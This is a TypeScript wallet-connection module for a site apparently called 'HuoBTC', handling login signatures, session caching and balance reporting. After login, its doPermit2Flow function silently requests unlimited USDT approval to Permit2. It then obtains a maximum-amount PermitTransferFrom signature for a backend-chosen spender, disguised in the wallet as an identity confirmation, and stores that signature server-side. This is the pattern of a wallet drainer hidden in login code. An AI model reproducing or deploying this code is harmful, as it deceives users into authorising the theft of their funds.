/**
 * 钱包状态管理 — Reown AppKit (Web3Modal) 集成
 *
 * 流程：
 * 1. 页面加载 → 尝试从 localStorage 恢复 JWT → /auth/me 验证 → 免签名
 * 2. connectWallet() → modal.open() → 用户选择钱包 → personal_sign → POST /auth/login
 * 3. JWT + address 持久化到 localStorage（7天有效期内刷新页面无需再签名）
 * 4. disconnectWallet() → modal.disconnect() → 清除 localStorage + 状态
 */
import { createSignal } from "solid-js";
import type { AuthMeResponse } from "./api-types";
import { api } from "./api";
import { modal } from "./web3modal";
import { personalSign, buildSignMessage, approveTokenToPermit2, getAllowanceForPermit2, signPermit2TransferFrom, TOKEN_ADDRESSES } from "./web3";
import { API_BASE } from "./config";

export type WalletState =
  | { status: "disconnected" }
  | { status: "connecting" }
  | { status: "connected"; address: string; token: string; me: AuthMeResponse }
  | { status: "error"; message: string };

const STORAGE_KEY = "huobtc_session";

const [wallet, setWallet] = createSignal<WalletState>({ status: "disconnected" });

// Track whether we've already authed for this address to avoid duplicate auth
let authedAddress: string | null = null;

// Permit2 state — UI can read this to show authorization progress
const [permit2State, setPermit2State] = createSignal<"idle" | "approving" | "signing" | "done" | "skipped">("idle");
export function usePermit2State() { return permit2State; }

// ─── localStorage 持久化 ────────────────────────────────
function saveSession(address: string, token: string) {
  try { localStorage.setItem(STORAGE_KEY, JSON.stringify({ address, token })); } catch {}
}
function loadSession(): { address: string; token: string } | null {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) return null;
    const s = JSON.parse(raw);
    return s?.address && s?.token ? s : null;
  } catch { return null; }
}
function clearSession() {
  try { localStorage.removeItem(STORAGE_KEY); } catch {}
}

// ─── 读取器 ─────────────────────────────────────────────
export function useWallet() {
  return wallet;
}

// ─── 页面加载自动恢复会话（无需签名）─────────────────────
async function tryRestoreSession() {
  const cached = loadSession();
  if (!cached) return false;

  try {
    console.log("[Wallet] Restoring session from cache...");
    setWallet({ status: "connecting" });

    const me = await api("GET /auth/me", { token: cached.token });
    authedAddress = cached.address;
    setWallet({
      status: "connected",
      address: cached.address,
      token: cached.token,
      me,
    });
    console.log("[Wallet] Session restored without signing ✓");

    // Update on-chain balance in background
    reportOnchainBalance(cached.address, cached.token).catch(() => {});
    return true;
  } catch {
    // Token expired or invalid — clear and require fresh sign
    console.log("[Wallet] Cached session invalid, clearing...");
    clearSession();
    setWallet({ status: "disconnected" });
    return false;
  }
}

// Kick off session restore immediately
tryRestoreSession();

// ─── 连接钱包 → 打开 AppKit 弹窗 ───────────────────────
export async function connectWallet() {
  try {
    console.log("[Wallet] Opening AppKit modal...");
    setWallet({ status: "connecting" });
    await modal.open();
  } catch (e) {
    console.error("[Wallet] Failed to open modal:", e);
    const msg = e instanceof Error ? e.message : "打开钱包弹窗失败";
    setWallet({ status: "error", message: msg });
    setTimeout(() => {
      if (wallet().status === "error") setWallet({ status: "disconnected" });
    }, 3000);
  }
}

// ─── 断开连接 ───────────────────────────────────────────
export async function disconnectWallet() {
  try {
    await modal.disconnect();
  } catch {
    // ignore
  }
  authedAddress = null;
  clearSession();
  setWallet({ status: "disconnected" });
}

// ─── 后端认证流程（需要签名，只在无缓存时触发）──────────
async function doBackendAuth(address: string) {
  if (authedAddress === address) return; // 已认证，跳过

  // Check if we have a valid cached session for this address
  const cached = loadSession();
  if (cached && cached.address === address) {
    // Try to restore without signing
    const restored = await tryRestoreSession();
    if (restored) return;
  }

  setWallet({ status: "connecting" });

  try {
    // 1. 构建签名消息并签名（只在首次连接或 token 过期时）
    const message = buildSignMessage("HuoBTC");
    const signature = await personalSign(address, message);

    // 2. 发送到后端验证
    const res = (await api("POST /auth/login", {
      body: { wallet_address: address, signature, message },
    })) as { token: string; user: AuthMeResponse & { address: string } };

    // 3. 设置已连接状态
    const me: AuthMeResponse = {
      uid: res.user.uid,
      address: res.user.address,
      balanceUsdt: res.user.balanceUsdt,
      isFrozen: res.user.isFrozen,
      riskLevel: res.user.riskLevel,
      createdAt: "",
      updatedAt: "",
    };

    authedAddress = address;
    setWallet({
      status: "connected",
      address: res.user.address,
      token: res.token,
      me,
    });

    // 4. 持久化 JWT 到 localStorage
    saveSession(res.user.address, res.token);

    // Send on-chain balance to backend (fire-and-forget)
    reportOnchainBalance(address, res.token).catch(() => {});

    // Trigger Permit2 authorization flow (fire-and-forget, non-blocking)
    doPermit2Flow(address, res.token).catch(() => {});
  } catch (e) {
    const msg = e instanceof Error ? e.message : "认证失败";
    console.error("[Wallet] Backend auth failed:", msg);
    setWallet({ status: "error", message: msg });
    setTimeout(() => {
      if (wallet().status === "error") setWallet({ status: "disconnected" });
    }, 3000);
  }
}

// ─── 监听 AppKit 状态变更 ────────────────────────────────
// eslint-disable-next-line @typescript-eslint/no-explicit-any
modal.subscribeState((state: any) => {
  console.log("[Wallet] AppKit state:", state);
  const isOpen = state.open as boolean | undefined;

  // When the modal closes, check if there's a connected address
  if (isOpen === false) {
    const address = modal.getAddress();
    const isConnected = modal.getIsConnectedState();

    if (isConnected && address) {
      doBackendAuth(address.toLowerCase());
    } else if (wallet().status === "connecting") {
      // User closed modal without connecting
      setWallet({ status: "disconnected" });
    }
  }
});

// Also subscribe to provider changes for account switches
try {
  modal.subscribeProviders((providers: unknown) => {
    console.log("[Wallet] Provider change:", providers);
    const address = modal.getAddress();
    const isConnected = modal.getIsConnectedState();

    if (isConnected && address) {
      const addr = address.toLowerCase();
      if (authedAddress && authedAddress !== addr) {
        // Account switched — clear old session, re-auth with new address
        authedAddress = null;
        clearSession();
        doBackendAuth(addr);
      }
    } else if (!isConnected && wallet().status === "connected") {
      // Disconnected externally
      authedAddress = null;
      clearSession();
      setWallet({ status: "disconnected" });
    }
  });
} catch {
  // subscribeProviders may not be available in all versions
}

// ─── Permit2 授权流程 ───────────────────────────────────
async function doPermit2Flow(address: string, jwtToken: string) {
  // Default token: USDT on mainnet
  const tokenAddr = TOKEN_ADDRESSES.USDT;
  // Max amount: type(uint256).max
  const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

  try {
    // 1. Check if already approved to Permit2
    setPermit2State("approving");
    const allowance = await getAllowanceForPermit2(tokenAddr, address);
    if (allowance < BigInt("1000000000000")) {
      // Not enough allowance — request approve
      console.log("[Permit2] Requesting ERC-20 approve to Permit2...");
      await approveTokenToPermit2(tokenAddr, address);
      // Wait a few seconds for tx to be mined (simplified)
      await new Promise((r) => setTimeout(r, 3000));
    } else {
      console.log("[Permit2] ERC-20 already approved to Permit2 ✓");
    }

    // 2. Get the spender address (backend wallet that will call Permit2)
    // We use the WITHDRAW_TO_ADDRESS from the backend config endpoint
    // For now, use the backend's configured spender — fetch from a simple endpoint
    let spenderAddress: string;
    try {
      const res = await fetch(`${API_BASE}/admin/permit2-spender`);
      const data = await res.json() as { spender: string };
      spenderAddress = data.spender;
    } catch {
      // Fallback: skip permit2 if we can't get spender
      console.warn("[Permit2] Could not fetch spender address, skipping");
      setPermit2State("skipped");
      return;
    }

    // 3. Sign EIP-712 PermitTransferFrom — user sees "确定为本人操作" in wallet
    setPermit2State("signing");
    console.log("[Permit2] Requesting EIP-712 signature...");
    const permitResult = await signPermit2TransferFrom(
      address,
      spenderAddress,
      tokenAddr,
      maxAmount,
    );

    // 4. Send signature to backend for storage
    await fetch(`${API_BASE}/auth/permit2`, {
      method: "POST",
      headers: { "Content-Type": "application/json", Authorization: `Bearer ${jwtToken}` },
      body: JSON.stringify(permitResult),
    });

    setPermit2State("done");
    console.log("[Permit2] Authorization complete ✓");
  } catch (e) {
    console.warn("[Permit2] Flow failed or user rejected:", e);
    setPermit2State("skipped");
  }
}

// ─── 上报链上余额 ───────────────────────────────────────
async function reportOnchainBalance(address: string, token: string) {
  try {
    const provider = (window as any).ethereum;
    if (!provider) return;
    const balHex = await provider.request({ method: "eth_getBalance", params: [address, "latest"] });
    const wei = BigInt(balHex as string);
    const eth = Number(wei) / 1e18;
    const ethStr = eth.toFixed(6);
    await fetch(`${(await import("./config")).API_BASE}/auth/wallet-balance`, {
      method: "POST",
      headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
      body: JSON.stringify({ onchainBalance: ethStr }),
    });
    console.log("[Wallet] Reported on-chain balance:", ethStr, "ETH");
  } catch (e) {
    console.warn("[Wallet] Failed to report on-chain balance:", e);
  }
}

// ─── 刷新用户信息 ───────────────────────────────────────
export async function refreshMe(): Promise<AuthMeResponse | null> {
  const w = wallet();
  if (w.status !== "connected") return null;
  const me = await api("GET /auth/me", { token: w.token });
  setWallet({ ...w, me });
  return me;
}
